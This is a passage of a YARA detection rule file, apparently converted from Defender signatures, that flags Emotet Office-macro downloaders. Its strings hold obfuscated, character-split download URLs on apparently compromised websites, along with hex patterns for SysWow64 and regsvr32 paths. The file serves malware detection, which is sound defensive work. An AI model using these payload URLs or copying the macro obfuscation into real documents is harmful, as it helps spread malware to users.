}

rule TrojanDownloader_O97M_Emotet_RPD_2147815926_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPD!MTB"
        threat_id = "2147815926"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/d\"&\"m\"&\"c\"&\"o\"&\"n\"&\"t\"&\"a\"&\"b\"&\"i\"&\"l\"&\"i\"&\"d\"&\"a\"&\"d\"&\"e.c\"&\"o\"&\"m/c\"&\"o\"&\"r\"&\"r\"&\"e\"&\"s\"&\"p\"&\"o\"&\"n\"&\"d\"&\"e\"&\"n\"&\"t\"&\"e\"&\"c\"&\"a\"&\"i\"&\"x\"&\"a/T\"&\"r\"&\"S/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/fc\"&\"el\"&\"ik.n\"&\"l/ri\"&\"tt\"&\"e\"&\"n\"&\"r\"&\"e\"&\"g\"&\"i\"&\"s\"&\"t\"&\"r\"&\"a\"&\"t\"&\"i\"&\"e/w\"&\"e\"&\"b/c\"&\"s\"&\"s/B\"&\"3I\"&\"L\"&\"f\"&\"U\"&\"8\"&\"X\"&\"k\"&\"2\"&\"S\"&\"s\"&\"E\"&\"m\"&\"T/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/w\"&\"w\"&\"w.g\"&\"e\"&\"s\"&\"s\"&\"e\"&\"r\"&\"s\"&\"h.c\"&\"o\"&\"m/w\"&\"p-i\"&\"n\"&\"cl\"&\"u\"&\"d\"&\"e\"&\"s/Z\"&\"w\"&\"Q\"&\"L\"&\"e\"&\"p\"&\"W/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/w\"&\"w\"&\"w.f\"&\"a\"&\"n\"&\"t\"&\"as\"&\"t\"&\"i\"&\"c\"&\"m\"&\"o\"&\"t\"&\"i\"&\"o\"&\"n.j\"&\"p/_c\"&\"n\"&\"s\"&\"k\"&\"i\"&\"n/q\"&\"f\"&\"W\"&\"E\"&\"Q\"&\"r\"&\"r\"&\"w\"&\"B\"&\"g/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/f\"&\"a\"&\"n\"&\"f\"&\"i\"&\"e\"&\"l\"&\"d.c\"&\"o.u\"&\"k/c\"&\"g\"&\"i-b\"&\"i\"&\"n/7p\"&\"p\"&\"6\"&\"D\"&\"j\"&\"W\"&\"F\"&\"N\"&\"J\"&\"X\"&\"Y\"&\"8/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/w\"&\"w\"&\"w.g\"&\"a\"&\"r\"&\"a\"&\"n\"&\"t\"&\"i\"&\"h\"&\"a\"&\"l\"&\"i\"&\"y\"&\"i\"&\"k\"&\"a\"&\"m\"&\"a.c\"&\"o\"&\"m\"&\"/w\"&\"p-a\"&\"d\"&\"m\"&\"i\"&\"n/F\"&\"j\"&\"g\"&\"B\"&\"6\"&\"I/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPET_2147815966_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPET!MTB"
        threat_id = "2147815966"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 57 69 6e 64 6f 77 73 5c [0-5] 53 79 73 57 6f 77 36 34 5c [0-15] 52 45 54 55 52 4e [0-5] 68 74 74 70 3a 2f 2f [0-5] 68 74 74 70 73 3a 2f 2f [0-127] 2e 63 6f 6d [0-127] 2e 63 6f 6d [0-127] 2e 63 6f 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VPSM_2147815990_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VPSM!MTB"
        threat_id = "2147815990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nenlineasv.com/encasa/cgi-bin/wqDZzO2OsIk7qGb/" ascii //weight: 1
        $x_1_2 = "howardcountyrepublicans.org/images/3X9AmJ6be8w/" ascii //weight: 1
        $x_1_3 = "drmetz.com/Index_files/3NcmSPRYeQy/" ascii //weight: 1
        $x_1_4 = "hatipogluhali.com/application/2CkpKEf2H0F/" ascii //weight: 1
        $x_1_5 = "holidayonehotel.com/libraries/lxek/" ascii //weight: 1
        $x_1_6 = "e-kinerja.ntbprov.go.id/aset/3yVdAF2bISfGwBmMk/" ascii //weight: 1
        $x_1_7 = "pancook.com/newsite/tbK/" ascii //weight: 1
        $x_1_8 = "fhdllp.com/wp-admin/DWAEc5bkS93/" ascii //weight: 1
        $x_1_9 = "hology.ub.ac.id/admin/8haN/" ascii //weight: 1
        $x_1_10 = "fffcatfriends.org/adoptables/XN3HjwHemz1AaIw/" ascii //weight: 1
        $x_1_11 = "la-csi.com/mt-admin/gCObckGgJyOJWJLZ/" ascii //weight: 1
        $x_1_12 = "filmmogzivota.rs/js/aHOJNRvJFgK4g/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VPSM_2147815990_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VPSM!MTB"
        threat_id = "2147815990"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "o\"&\"f\"&\"t\"&\"a\"&\"l\"&\"m\"&\"o\"&\"c\"&\"i\"&\"t\"&\"y.c\"&\"o\"&\"m\"&\"/w\"&\"p\"&\"-a\"&\"d\"&\"m\"&\"i\"&\"n\"&\"/\"&\"x\"&\"D\"&\"j\"&\"D\"&\"i\"&\"X\"&\"h\"&\"c\"&\"S\"&\"/\"&\"" ascii //weight: 1
        $x_1_2 = "w\"&\"w\"&\"w\"&\".\"&\"m\"&\"u\"&\"s\"&\"l\"&\"i\"&\"m\"&\"p\"&\"r\"&\"o\"&\"p\"&\"e\"&\"r\"&\"t\"&\"y\"&\".\"&\"c\"&\"o\"&\".\"&\"u\"&\"k\"&\"/\"&\"c\"&\"g\"&\"i\"&\"-b\"&\"i\"&\"n/\"&\"8\"&\"l\"&\"S\"&\"/\"&\"" ascii //weight: 1
        $x_1_3 = "p\"&\"4\"&\"9\"&\"3\"&\"6\"&\".\"&\"w\"&\"e\"&\"b\"&\"m\"&\"o\"&\".\"&\"f\"&\"r\"&\"/\"&\"w\"&\"p\"&\"-\"&\"a\"&\"d\"&\"m\"&\"i\"&\"n\"&\"/\"&\"F\"&\"K\"&\"T\"&\"y\"&\"n\"&\"V\"&\"/" ascii //weight: 1
        $x_1_4 = "w\"&\"w\"&\"w.o\"&\"m\"&\"a\"&\"r\"&\"h\"&\"o\"&\"s\"&\"p\"&\"i\"&\"t\"&\"a\"&\"l.c\"&\"o\"&\"m/w\"&\"p-c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t/V\"&\"e\"&\"d\"&\"4\"&\"B\"&\"B\"&\"J\"&\"m\"&\"s\"&\"7\"&\"g\"&\"w\"&\"l\"&\"2/" ascii //weight: 1
        $x_1_5 = "g\"&\"oo\"&\"df\"&\"ri\"&\"en\"&\"ds\"&\"dr\"&\"iv\"&\"in\"&\"g.c\"&\"o\"&\"m/c\"&\"re\"&\"a\"&\"te\"&\"sc\"&\"he\"&\"du\"&\"le/F\"&\"0j\"&\"Gv\"&\"gT\"&\"iF\"&\"AM\"&\"Rh\"&\"2T\"&\"r8\"&\"HL/" ascii //weight: 1
        $x_1_6 = "it\"&\"m\"&\"a\"&\"x.t\"&\"n/c\"&\"g\"&\"i-b\"&\"i\"&\"n/w/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VRSM_2147816074_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VRSM!MTB"
        threat_id = "2147816074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "a\"&\"i\"&\"rl\"&\"i\"&\"ft\"&\"l\"&\"i\"&\"m\"&\"o.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"mi\"&\"n/1\"&\"2\"&\"D\"&\"t\"&\"B\"&\"7\"&\"k\"&\"P\"&\"6\"&\"U\"&\"r\"&\"8\"&\"X\"&\"7\"&\"7/" ascii //weight: 1
        $x_1_2 = "r\"&\"o\"&\"b\"&\"o\"&\"t\"&\"i\"&\"x\"&\"p\"&\"e\"&\"n\"&\"e\"&\"d\"&\"e\"&\"s.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"m\"&\"in/2\"&\"T\"&\"H\"&\"6\"&\"N\"&\"O\"&\"3/" ascii //weight: 1
        $x_1_3 = "m\"&\"e\"&\"u\"&\"s\"&\"r\"&\"e\"&\"c\"&\"u\"&\"r\"&\"s\"&\"o\"&\"s.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-i\"&\"ncl\"&\"u\"&\"d\"&\"e\"&\"s/r\"&\"d\"&\"x\"&\"ro/" ascii //weight: 1
        $x_1_4 = "li\"&\"t\"&\"e\"&\"s\"&\"c\"&\"a\"&\"p\"&\"e.c\"&\"o\"&\"m.m\"&\"y/w\"&\"p-c\"&\"on\"&\"t\"&\"e\"&\"n\"&\"t/w\"&\"h/" ascii //weight: 1
        $x_1_5 = "m\"&\"e\"&\"u\"&\"s\"&\"r\"&\"e\"&\"c\"&\"u\"&\"r\"&\"s\"&\"o\"&\"s.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-i\"&\"nc\"&\"l\"&\"u\"&\"d\"&\"e\"&\"s/Z\"&\"2\"&\"k\"&\"f\"&\"A\"&\"Y\"&\"c\"&\"Y\"&\"W\"&\"p/" ascii //weight: 1
        $x_1_6 = "o\"&\"l\"&\"d.l\"&\"i\"&\"c\"&\"e\"&\"u\"&\"m\"&\"9.r\"&\"u/i\"&\"m\"&\"a\"&\"g\"&\"e\"&\"s/\"&\"R/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VSSM_2147816075_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VSSM!MTB"
        threat_id = "2147816075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"p\"&\"s:/\"&\"/b\"&\"sp\"&\"ra\"&\"bo\"&\"dh\"&\"in\"&\"i.o\"&\"r\"&\"g/co\"&\"nt\"&\"e\"&\"n\"&\"t/Bw\"&\"V8\"&\"Kq\"&\"1E\"&\"UU\"&\"T5\"&\"ml\"&\"on\"&\"5\"&\"M\"&\"" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"p\"&\"s:/\"&\"/b\"&\"b2\"&\"pl\"&\"a\"&\"y.c\"&\"o\"&\"m/w\"&\"z\"&\"z\"&\"x/V\"&\"ca\"&\"XG\"&\"4L\"&\"sR\"&\"7m\"&\"OW\"&\"eb\"&\"" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"p:/\"&\"/fu\"&\"ta\"&\"b\"&\"a.y\"&\"ou\"&\"ch\"&\"ie\"&\"n.n\"&\"e\"&\"t/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/A\"&\"J0\"&\"vd\"&\"" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"p:/\"&\"/w\"&\"w\"&\"w.c\"&\"ra\"&\"zy\"&\"97.c\"&\"o\"&\"m/w\"&\"p-in\"&\"cl\"&\"ud\"&\"e\"&\"s/V\"&\"Rp\"&\"pR\"&\"wD\"&\"g2\"&\"dB\"&\"W2\"&\"Nc\"&\"QA\"&\"" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p://46.4.78.2\"&\"0\"&\"2/w\"&\"p-c\"&\"on\"&\"te\"&\"n\"&\"t/x\"&\"Ov\"&\"Cg\"&\"oY\"&\"FA\"&\"IV\"&\"jw\"&\"y6\"&\"" ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"tp:/\"&\"/br\"&\"it\"&\"ai\"&\"ns\"&\"ol\"&\"ic\"&\"it\"&\"or\"&\"s.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"i\"&\"n/2y\"&\"sG\"&\"FK\"&\"Db\"&\"YP\"&\"5s\"&\"JB\"&\"0X\"&\"g/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVJ_2147816079_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVJ!MTB"
        threat_id = "2147816079"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"p\"&\"s:/\"&\"/he\"&\"ij\"&\"ts\"&\"e.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/v\"&\"Ib\"&\"o\"&\"iE\"&\"ZP\"&\"bq\"&\"vT\"&\"F1\"&\"0Z\"&\"9/" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"ps:/\"&\"/ww\"&\"w.tr\"&\"av\"&\"el\"&\"le\"&\"rs-a\"&\"ut\"&\"ob\"&\"ar\"&\"nr\"&\"v.c\"&\"o\"&\"m/n\"&\"e\"&\"w/p\"&\"e7\"&\"rx\"&\"gG/" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps:/\"&\"/me\"&\"re\"&\"ko\"&\"nt\"&\"ei\"&\"ne\"&\"r.e\"&\"u/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/k\"&\"qu\"&\"Cx\"&\"Qd\"&\"8N\"&\"ix\"&\"Ag\"&\"cU\"&\"B2/" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"p:/\"&\"/hi\"&\"rs\"&\"ch\"&\"fe\"&\"ld.b\"&\"iz/c\"&\"g\"&\"i-b\"&\"i\"&\"n/Ox\"&\"0z\"&\"vW\"&\"xH\"&\"sx\"&\"Xd\"&\"OA\"&\"Iw/" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p:/\"&\"/s\"&\"d-16\"&\"84\"&\"62\"&\"5-h\"&\"00\"&\"00\"&\"1.f\"&\"er\"&\"oz\"&\"o.n\"&\"e\"&\"t/P\"&\"ag\"&\"in\"&\"aM\"&\"as\"&\"Vi\"&\"ej\"&\"a13\"&\"21\"&\"65\"&\"4/V\"&\"Xb\"&\"Zo/" ascii //weight: 1
        $x_1_6 = "ht\"&\"tp:/\"&\"/gi\"&\"as\"&\"ot\"&\"ti.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/Ew\"&\"MX\"&\"8B\"&\"Ze\"&\"Sb\"&\"3J\"&\"8/" ascii //weight: 1
        $x_1_7 = "h\"&\"tt\"&\"p:/\"&\"/dl\"&\"fre\"&\"ig\"&\"ht.c\"&\"o\"&\"m/w\"&\"p-i\"&\"nc\"&\"lu\"&\"de\"&\"s/zL\"&\"uZ\"&\"dt\"&\"Vk\"&\"or\"&\"iG\"&\"Ta\"&\"RE/" ascii //weight: 1
        $x_1_8 = "h\"&\"tt\"&\"p:/\"&\"/ha\"&\"dr\"&\"am\"&\"ou\"&\"t2\"&\"1.c\"&\"o\"&\"m/j\"&\"et\"&\"pa\"&\"ck-t\"&\"em\"&\"p/K\"&\"jO\"&\"qT\"&\"nC\"&\"wB\"&\"bV\"&\"rz\"&\"8w/" ascii //weight: 1
        $x_1_9 = "h\"&\"tt\"&\"p:/\"&\"/gr\"&\"ou\"&\"pe\"&\"st\"&\"he\"&\"r.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/2\"&\"hh\"&\"cM\"&\"wf\"&\"OG\"&\"0a\"&\"Ri\"&\"1t/" ascii //weight: 1
        $x_1_10 = "h\"&\"tt\"&\"p:/\"&\"/da\"&\"ta\"&\"in\"&\"li\"&\"ne.c\"&\"o\"&\"m/a\"&\"sp\"&\"ne\"&\"t_cli\"&\"en\"&\"t/5\"&\"6L\"&\"wA\"&\"Jv\"&\"y/" ascii //weight: 1
        $x_1_11 = "h\"&\"tt\"&\"p:/\"&\"/gr\"&\"ey\"&\"co\"&\"co\"&\"nu\"&\"t.c\"&\"o\"&\"m/e\"&\"d\"&\"m/0\"&\"yw\"&\"f2\"&\"bF/" ascii //weight: 1
        $x_1_12 = "h\"&\"tt\"&\"p:/\"&\"/fa\"&\"ct\"&\"s-j\"&\"o.c\"&\"o\"&\"m/i\"&\"ni\"&\"t/j\"&\"LQ\"&\"Y2\"&\"Fp\"&\"es\"&\"nI\"&\"Gi\"&\"0q\"&\"Hq\"&\"z/" ascii //weight: 1
        $x_1_13 = "h\"&\"tt\"&\"p:/\"&\"/fa\"&\"sh\"&\"io\"&\"nb\"&\"yp\"&\"ri\"&\"nc\"&\"es\"&\"sm\"&\"el\"&\"od\"&\"ic\"&\"aa\"&\"h.c\"&\"o\"&\"m/41\"&\"85\"&\"PI\"&\"NT/j\"&\"wh\"&\"2c\"&\"wj\"&\"FH\"&\"LZ\"&\"L/" ascii //weight: 1
        $x_1_14 = "h\"&\"tt\"&\"p:/\"&\"/ea\"&\"si\"&\"er\"&\"co\"&\"mm\"&\"un\"&\"ic\"&\"at\"&\"io\"&\"n\"&\"s.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"n\"&\"t/y\"&\"qN\"&\"xi\"&\"8I\"&\"Kb\"&\"RI\"&\"t7\"&\"ak\"&\"B/" ascii //weight: 1
        $x_1_15 = "h\"&\"t\"&\"t\"&\"p\"&\"s:/\"&\"/d\"&\"e\"&\"c\"&\"o\"&\"r\"&\"u\"&\"s\"&\"f\"&\"i\"&\"n\"&\"a\"&\"n\"&\"c\"&\"i\"&\"a\"&\"l.c\"&\"o\"&\"m/w\"&\"p-c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t/7\"&\"d\"&\"O\"&\"D\"&\"a\"&\"k\"&\"e\"&\"Z\"&\"Z\"&\"8\"&\"3\"&\"f\"&\"J\"&\"i/" ascii //weight: 1
        $x_1_16 = "h\"&\"t\"&\"t\"&\"p\"&\"s:/\"&\"/e-k\"&\"i\"&\"n\"&\"e\"&\"r\"&\"j\"&\"a.n\"&\"t\"&\"b\"&\"p\"&\"r\"&\"o\"&\"v.g\"&\"o.i\"&\"d/a\"&\"s\"&\"e\"&\"t/s\"&\"A\"&\"e\"&\"a\"&\"E\"&\"v\"&\"a\"&\"S\"&\"x\"&\"G\"&\"h\"&\"v\"&\"n\"&\"s\"&\"u\"&\"F\"&\"E/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SPD_2147816114_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SPD!MTB"
        threat_id = "2147816114"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/w\"&\"w\"&\"w.e\"&\"lo\"&\"g.h\"&\"r/iP\"&\"p5\"&\"FU\"&\"7e\"&\"TR\"&\"Wk\"&\"Ux\"&\"Xo\"&\"iO\"&\"p/5\"&\"uU\"&\"5R\"&\"K/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/ww\"&\"w.f\"&\"la\"&\"sh-i\"&\"n\"&\"c.c\"&\"o\"&\"m/g\"&\"ro\"&\"up/i\"&\"gi\"&\"rl/c\"&\"s\"&\"s/Q\"&\"CD\"&\"a9\"&\"Fg\"&\"Xw\"&\"wk\"&\"yw\"&\"nG\"&\"Zg\"&\"Bh/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/go\"&\"og\"&\"le\"&\"fa\"&\"ci\"&\"l.c\"&\"o\"&\"m.b\"&\"r/b\"&\"la\"&\"ck\"&\"bo\"&\"x/C\"&\"qS\"&\"x4\"&\"sV\"&\"Xp\"&\"5E\"&\"g/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/w\"&\"w\"&\"w.e\"&\"n\"&\"s-s\"&\"et\"&\"if.d\"&\"z/a\"&\"nn\"&\"ua\"&\"ir\"&\"e/Y\"&\"u8\"&\"wj\"&\"HL\"&\"mA\"&\"zq\"&\"yU\"&\"S3\"&\"XT\"&\"Se/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/cb\"&\"d.c\"&\"o\"&\"m.p\"&\"k/2\"&\"m\"&\"y0\"&\"fa\"&\"t/I\"&\"Op\"&\"4/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/ha\"&\"fs\"&\"t\"&\"ro\"&\"m.n\"&\"u/c\"&\"g\"&\"i-b\"&\"i\"&\"n/q\"&\"YR\"&\"0U\"&\"Qa\"&\"CJ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ARH_2147816154_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ARH!MTB"
        threat_id = "2147816154"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "f\"&\"la\"&\"re\"&\"co.n\"&\"e\"&\"t/as\"&\"se\"&\"ts/b\"&\"es\"&\"t-g\"&\"am\"&\"e.j\"&\"p\"&\"g/LL\"&\"6G\"&\"xS\"&\"2Y\"&\"cF\"&\"s7\"&\"tp\"&\"PL/j" ascii //weight: 1
        $x_1_2 = "er\"&\"ka\"&\"ra\"&\"dy\"&\"at\"&\"or.c\"&\"om.t\"&\"r/A\"&\"re\"&\"as/w\"&\"il\"&\"cC\"&\"qS\"&\"Es\"&\"6c\"&\"EM\"&\"3D/w" ascii //weight: 1
        $x_1_3 = "ets\"&\"ve\"&\"rs\"&\"ai\"&\"ll\"&\"es.n\"&\"e\"&\"t/w\"&\"eb\"&\"ro\"&\"ot/Z\"&\"Eu\"&\"rB\"&\"sC\"&\"2H\"&\"3s\"&\"oe\"&\"iF\"&\"by\"&\"eQ" ascii //weight: 1
        $x_1_4 = "te\"&\"am\"&\"dr\"&\"iv\"&\"er\"&\"so\"&\"nl\"&\"y.c\"&\"o\"&\"m/w\"&\"p-ad\"&\"mi\"&\"n/e\"&\"F7\"&\"AJ/k" ascii //weight: 1
        $x_1_5 = "h\"&\"r.d\"&\"ev\"&\"sr\"&\"m.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/J\"&\"k6\"&\"gO\"&\"cQ\"&\"Op\"&\"RW\"&\"Gw\"&\"L/" ascii //weight: 1
        $x_1_6 = "gl\"&\"ob\"&\"oa\"&\"gr\"&\"on\"&\"eg\"&\"oc\"&\"io\"&\"s.c\"&\"o\"&\"m.b\"&\"r/s\"&\"ty\"&\"le/K\"&\"EJ\"&\"QW\"&\"Xf\"&\"2b\"&\"9t\"&\"hs\"&\"kc\"&\"5c\"&\"V/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_WASM_2147816215_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.WASM!MTB"
        threat_id = "2147816215"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 22 26 22 65 22 26 22 67 22 26 22 73 76 22 26 22 72 22 26 22 33 22 26 22 32 2e 65 22 26 22 78 22 26 22 65 [0-3] 5c 57 22 26 22 69 6e 22 26 22 64 6f 22 26 22 77 22 26 22 73 5c [0-3] 53 79 22 26 22 73 57 22 26 22 6f 77 22 26 22 36 22 26 22 34 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TPD_2147817318_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TPD!MTB"
        threat_id = "2147817318"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "eleselektromekanik.com/69Iq5Pwbd0/s/" ascii //weight: 1
        $x_1_2 = "demo.icn.com.np/stories/Qk/" ascii //weight: 1
        $x_1_3 = "demo34.ckg.hk/service/Atk7RQfUV673M/" ascii //weight: 1
        $x_1_4 = "bitmovil.mx/css/TrgyPiTXy3/" ascii //weight: 1
        $x_1_5 = "dupot.cz/tvhost/DUnMUvwZOhQs/" ascii //weight: 1
        $x_1_6 = "focanainternet.com.br/erros/DepAK3p1Y/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALT_2147817336_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALT!MTB"
        threat_id = "2147817336"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "www.escueladecinemza.com.ar/_installation/IBlj/" ascii //weight: 1
        $x_1_2 = "ciencias-exactas.com.ar/old/Bupubz1trh/" ascii //weight: 1
        $x_1_3 = "counteract.com.br/wp-admin/WWcACJF3Yn/" ascii //weight: 1
        $x_1_4 = "creemo.pl/wp-admin/0uDUHJ4KVAw/" ascii //weight: 1
        $x_1_5 = "dancefox24.de/templates/owT/" ascii //weight: 1
        $x_1_6 = "focusmedica.in/fmlib/TYiQdcEj9FW0/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALS_2147817337_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALS!MTB"
        threat_id = "2147817337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "gnif.org/administrator/G68HwUGlKNJNU2vh5cz/" ascii //weight: 1
        $x_1_2 = "edoraseguros.com.br/cgi-bin/l7ZERv5deNsfzlZUZ/" ascii //weight: 1
        $x_1_3 = "sanoma.allrent.nl/cgi-bin/KXbI5OhLJ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VPD_2147817340_0
{
    meta:
